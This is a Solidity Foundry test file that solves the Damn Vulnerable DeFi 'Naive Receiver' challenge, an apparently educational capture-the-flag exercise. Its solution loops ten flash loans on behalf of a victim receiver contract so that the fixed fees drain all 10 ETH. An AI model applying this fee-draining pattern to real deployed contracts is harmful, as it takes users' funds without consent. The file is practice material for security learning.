// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "src/02.naive-receiver/FlashLoanReceiver.sol";
import "src/02.naive-receiver/NaiveReceiverLenderPool.sol";

contract ChallengeNaiveReceiver is Test {
  FlashLoanReceiver public receiver;
  NaiveReceiverLenderPool public pool;

  // Pool has 1000 ETH in balance
  uint256 public constant ETHER_IN_POOL = 1000 ether;
  // Receiver has 10 ETH in balance
  uint256 public constant ETHER_IN_RECEIVER = 10 ether;

  address public deployer = makeAddr("deployer");
  address public player = makeAddr("player");
  address public someUser = makeAddr("someUser");

  function setUp() public {
    /**
     * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
     */
    vm.startPrank(deployer);
    pool = new NaiveReceiverLenderPool();
    vm.deal(address(pool), ETHER_IN_POOL);

    address ETH = pool.ETH();

    assertEq(address(pool).balance, ETHER_IN_POOL);
    assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
    assertEq(pool.flashFee(ETH, 0), 1 ether);

    receiver = new FlashLoanReceiver(address(pool));
    vm.deal(address(receiver), ETHER_IN_RECEIVER);
    vm.expectRevert();
    receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 1 ether, "0x");
    assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
  }

  function test_solution() public {
    /**
     * CODE YOUR SOLUTION HERE
     */
    vm.deal(player, 100 ether);
    changePrank(player);
    for (uint256 i = 0; i < 10; i++) {
      pool.flashLoan(receiver, pool.ETH(), 100 ether, "0x");
    }
    /**
     * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
     */

    // All ETH has been drained from the receiver
    assertEq(address(receiver).balance, 0);
    assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
  }
}
